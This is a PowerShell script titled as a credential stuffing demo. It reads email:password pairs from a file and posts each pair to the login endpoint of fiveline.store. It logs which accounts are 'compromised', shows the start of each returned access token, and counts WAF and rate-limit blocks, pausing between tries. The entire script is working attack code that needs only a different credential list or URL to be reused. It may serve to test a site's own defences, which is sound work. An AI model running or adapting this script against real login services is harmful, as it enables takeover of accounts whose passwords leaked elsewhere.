Write-Host "================================================"
Write-Host "  [ATTACK] Credential Stuffing Demo"
Write-Host "  credential_dump_100k.txt (150 entries)"
Write-Host "================================================"
Write-Host ""

$SUCCESS = 0
$FAIL = 0
$BLOCKED = 0

$lines = Get-Content "$PSScriptRoot\credentials_demo.txt"

foreach ($line in $lines) {
    $parts = $line -split ":", 2
    $email = $parts[0]
    $password = $parts[1]

    $bodyObj = [PSCustomObject]@{
        email    = $email
        password = $password
    }
    $body = $bodyObj | ConvertTo-Json -Compress

    try {
        $response = Invoke-RestMethod -Method POST `
            -Uri "https://fiveline.store/api/auth/login" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop

        $token = $response.access_token.Substring(0, [Math]::Min(40, $response.access_token.Length))
        Write-Host "[SUCCESS] $email" -ForegroundColor Green
        Write-Host "          JWT: ${token}..." -ForegroundColor Green
        $SUCCESS++
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 403) {
            Write-Host "[BLOCKED WAF] $email" -ForegroundColor Yellow
            $BLOCKED++
        } elseif ($statusCode -eq 429) {
            Write-Host "[BLOCKED 429] $email" -ForegroundColor Yellow
            $BLOCKED++
        } else {
            Write-Host "[FAIL]    $email" -ForegroundColor Red
            $FAIL++
        }
    }

    Start-Sleep -Milliseconds 1000
}

Write-Host ""
Write-Host "================================================"
Write-Host "  RESULT: $SUCCESS compromised / $BLOCKED blocked / $FAIL failed"
Write-Host "================================================"
